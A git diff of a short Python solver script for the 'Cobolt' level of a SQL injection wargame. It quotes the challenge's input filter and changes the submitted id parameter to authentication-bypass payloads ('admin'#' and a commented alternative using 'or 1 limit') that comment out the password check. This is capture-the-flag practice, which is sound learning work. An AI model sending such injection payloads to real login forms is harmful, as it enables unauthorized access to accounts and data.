@@ -1,10 +1,11 @@
 #!/usr/bin/env python3
 import los
+import los_cookies
 
 
 def main():
     '''
-    Cobolt
+    Cobolt - simple sqli injection
 
     if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
     if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
@@ -16,10 +17,9 @@ def main():
     '''
 
     url = "https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php"
-    cook = los.check_cookies(url)
+    cook = los_cookies.check_cookies(url)
 
-    param = dict(id="admin' -- -")
-
+    param = dict(id="admin'#") # (id="' or 1 limit 1,1 #")
     response = los.get_request(url, param, cook)
 
     if 'Clear!' in response:
